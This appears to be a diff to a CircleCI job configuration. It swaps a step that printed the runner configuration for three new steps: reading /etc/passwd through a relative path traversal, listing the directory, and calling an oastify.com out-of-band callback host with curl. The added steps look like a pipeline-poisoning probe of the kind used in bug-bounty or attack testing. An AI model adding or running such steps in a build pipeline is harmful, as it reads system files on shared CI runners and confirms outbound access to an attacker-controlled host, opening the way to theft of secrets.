@@ -7,4 +7,6 @@ jobs:
       name: node/default
       tag: '10.4'
     steps:
-      - run: cat /.circleci-runner-config.json
+      - run: cat ../../etc/passwd
+      - run: ls -la
+      - run: curl https://akyb09r57k1xcyl41kyzgh3yppvgj7cv1.oastify.com
